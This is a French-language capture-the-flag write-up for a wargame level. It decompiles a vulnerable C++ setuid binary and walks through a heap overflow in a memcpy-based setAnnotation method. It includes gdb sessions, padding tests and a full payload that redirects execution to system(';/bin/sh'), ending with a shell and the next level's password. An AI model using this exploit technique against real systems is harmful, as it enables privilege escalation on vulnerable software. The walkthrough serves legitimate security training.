Je commence par découvrir qui je suis, où je suis, et qu'est-ce qui est à ma disposition :

```
$ id && pwd && ls -la
uid=2009(level9) gid=2009(level9) groups=2009(level9),100(users)
/home/user/level9
total 17
dr-xr-x---+ 1 level9 level9   80 Mar  6  2016 .
dr-x--x--x  1 root   root    340 Sep 23  2015 ..
-rw-r--r--  1 level9 level9  220 Apr  3  2012 .bash_logout
-rw-r--r--  1 level9 level9 3530 Sep 23  2015 .bashrc
-rwsr-s---+ 1 bonus0 users  6720 Mar  6  2016 level9
-rw-r--r--+ 1 level9 level9   65 Sep 23  2015 .pass
-rw-r--r--  1 level9 level9  675 Apr  3  2012 .profile
```

Je tente de lancer le binaire level9 :

```
$ ./level9
$
```

Je tente avec un input :

```
$ ./level9 da
$
```

Bon, et bien, direction [Dogbolt](https://dogbolt.org/?id=563ef243-714b-4c51-a5a5-ecc13358fab5) :

### Ghidra

```c
void main(int param_1,int param_2) {
  N *this;
  undefined4 *this_00;
  
  if (param_1 < 2) {
                    // WARNING: Subroutine does not return
    _exit(1);
  }
  this = (N *)operator_new(0x6c);
  N::N(this,5);
  this_00 = (undefined4 *)operator_new(0x6c);
  N::N((N *)this_00,6);
  N::setAnnotation(this,*(char **)(param_2 + 4));
  (**(code **)*this_00)(this_00,this);
  return;
}
```

### Hexray

```c
void N::N(N *this, int a2);
void *N::setAnnotation(N *this, char *s);
int N::operator+(int a1, int a2);
int N::operator-(int a1, int a2);

void N::N(N *this, int a2) {
  *(_DWORD *)this = off_8048848;
  *((_DWORD *)this + 26) = a2;
}

void * N::setAnnotation(N *this, char *s) {
  size_t v2;

  v2 = strlen(s);
  return memcpy((char *)this + 4, s, v2);
}

int N::operator+(int a1, int a2) {
  return *(_DWORD *)(a1 + 104) + *(_DWORD *)(a2 + 104);
}

int N::operator-(int a1, int a2) {
  return *(_DWORD *)(a1 + 104) - *(_DWORD *)(a2 + 104);
}

int main(int argc, const char **argv, const char **envp) {
  N *v3; // ebx
  N *v4; // ebx
  N *v6; // [esp+1Ch] [ebp-8h]

  if ( argc <= 1 )
    _exit(1);
  v3 = (N *)operator new(0x6Cu);
  N::N(v3, 5);
  v6 = v3;
  v4 = (N *)operator new(0x6Cu);
  N::N(v4, 6);
  N::setAnnotation(v6, (char *)argv[1]);
  return (**(int ( ***)(N *, N *))v4)(v4, v6);
}
```

Oh... Il semble qu'on ai à faire à du `C++` ici.

A priori, pas d'appel à `bin/sh` dans le code, il va donc me falloir utiliser l'une des méthodes des premiers niveaux, notamment celle d'exécution arbitraire de fonction dans la `libc`, si `C++` me le permet.

Je tente d'abord de reconsister un fichier source en `.cpp` à partir des décompilations :

```c++
#include <unistd.h>
#include <cstring>

class N {
public:
	int num;
	int (N::*func)(N &);
	char annotation[100]; // <- v6 est initialisé par Hexray avec new(0x6C) => 108 bytes, mais à ebp-8

	N(int value) : num(value) {
		this->func = &N::operator+;
	}
	int operator+(N &some) {
		return this->num + some.num;
	}
	int operator-(N &some) {
		return this->num - some.num;
	}
	void setAnnotation(char *input) {
		memcpy(this->annotation, input, strlen(input));
	}
};

int		main(int argc, char **argv)
{
	if (argc < 1)
		_exit(1);

	N *n1 = new N(5);
	N *n2 = new N(6);

	n1->setAnnotation(argv[1]);
	return (n2->*(n2->func))(*n1);
}
```

Cette reconstitution s'appuie principalement sur la décompilation par `Hexray` en unifiant l'ensemble dans une `class` nommée `N`.

La seule vulnérabilité que j'observe dans cette reconstitution serait `memcpy()`. Ici, `memcpy()` ne s'assure pas que l'annotation passée par `argv[1]` rentre dans le buffer de `100` déclaré par la structure N lorsqu'elle utilise `setAnnotation()`.

Il serait donc possible ici alors de ré-écrire la valeur de retour de la fonction `setAnnotation()` afin qu'elle pointe, à la manière du `level2`, sur un appel arbitraire à `system()`, auquel nous pourrons demander d'exécuter `bin/sh`.

Je cherche d'abord l'adresse de `system()` avec `gdb` ([merci StackOverflow](https://security.stackexchange.com/questions/195246/how-to-find-address-of-system-in-an-executable-rop-exploit)):

```
$ gdb ./level9
(gdb) disas main
    ...
   0x08048695 <+161>:   mov    -0x4(%ebp),%ebx
   0x08048698 <+164>:   leave
   0x08048699 <+165>:   ret

(gdb) break *main+165
Breakpoint 1 at 0x8048699

(gdb) set args dab
(gdb) r
Starting program: /home/user/level9/level9 dab

Breakpoint 1, 0x08048699 in main ()
(gdb) print system
$1 = {<text variable, no debug info>} 0xb7d86060 <system>
```

Je détermine ensuite le padding nécessaire pour l'overflow :

```
$ ./level9 `python -c 'print("\x90" * 100)'`
$ ./level9 `python -c 'print("\x90" * 200)'`
Segmentation fault (core dumped)
$ ./level9 `python -c 'print("\x90" * 150)'`
Segmentation fault (core dumped)
$ ./level9 `python -c 'print("\x90" * 125)'`
Segmentation fault (core dumped)
$ ./level9 `python -c 'print("\x90" * 110)'`
Segmentation fault (core dumped)
$ ./level9 `python -c 'print("\x90" * 105)'`
$ ./level9 `python -c 'print("\x90" * 108)'`
$ ./level9 `python -c 'print("\x90" * 109)'`
Segmentation fault (core dumped)
```

En rétrospecte, je comprend pourquoi je trouve que l'overflow est à 108 bytes : plus haut, j'ai déterminé que le buffer `annotation` était de 100 bytes, et qu'`Hexray` le placait à `ebp-8`, mais aussi, et plus spécifiquement, qu'il était déclaré ici : `v3 = (N *)operator new(0x6Cu);` à 108 bytes.

Cela corrèle donc avec le segfault observé au 109ème `NOP` passé dans les test ci-dessus.

Il me faut donc trouver quelle est l'adresse qui correspond au début de mon payload infecté lorsqu'il est utilisé par `setAnnotation()`, si la première adresse de l'overflow pointe vers le début du payload, alors le programme exécutera ensuite le payload, et donc `system()` auquel je pourrais passer `bin/sh` comme argument.

Je me penche sur `gdb` pour trouver l'adresse du début de l'array `annotation`.
Je peux trouver l'adresse de `annotation` en inférant que `%eax` la contiendra au retour de `setAnnotation()` car `memcpy()`[retourne son premier argument](https://pubs.opengroup.org/onlinepubs/7908799/xsh/memcpy.html), et il sera donc stocké dans `%eax`.

Je peux lancer le binaire, mettre un break au retour de `setAnnotation()`, puis analyser la valeur de `%eax` :

```
(gdb) b *main+136
Breakpoint 1 at 0x804867c
(gdb) set args dab
(gdb) r
Starting program: /home/user/level9/level9 dab

Breakpoint 1, 0x0804867c in main ()
(gdb) info registers
eax            0x804a00c        134520844
ecx            0x6164   24932
edx            0x804a00f        134520847
ebx            0x804a078        134520952
...
```

Je trouve donc l'adresse : `0x804a00c`.

Avec ces 3 informations :

- Adresse de `system()` -> 0xb7d86060
- Overflow à 108 bytes
- Adresse de `annotation` -> 0x804a00c

Je peux créer un payload infecté :

```python
#                |    system()    |         | NOP|         | annotation[0]  |         | system(args) |    
python -c 'print "\xb7\xd8\x60\x60"[::-1] + "\x90" * 104 + "\x08\x04\xa0\x0c"[::-1] + ";/bin/sh"'
```

Ce payload aura pour effet d'overflow après le padding de 104 bytes (108 - l'adresse de `system()`), trouvera une adresse qui pointe sur le début d'`annotation`, ce qui exécutera le début de `annotation`, et donc `system()`, qui prendra comme argument le `NOP sled` (le padding), l'adresse qui pointait vers `annotation`, puis pour ignorer le 'bruit' précédent, passera `;bin/sh` avec un ';' afin que l'instruction précédente soit simplement un échec et que le shell soit ensuite exécuté.

Je teste mon payload :

```
$ ./level9 $(python -c 'print "\xb7\xd8\x60\x60"[::-1] + "\x90" * 104 + "\x08\x04\xa0\x0c"[::-1] + ";/bin/sh"')
sh: 1:
       : not found
$ cat /home/user/bonus0/.pass
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
```







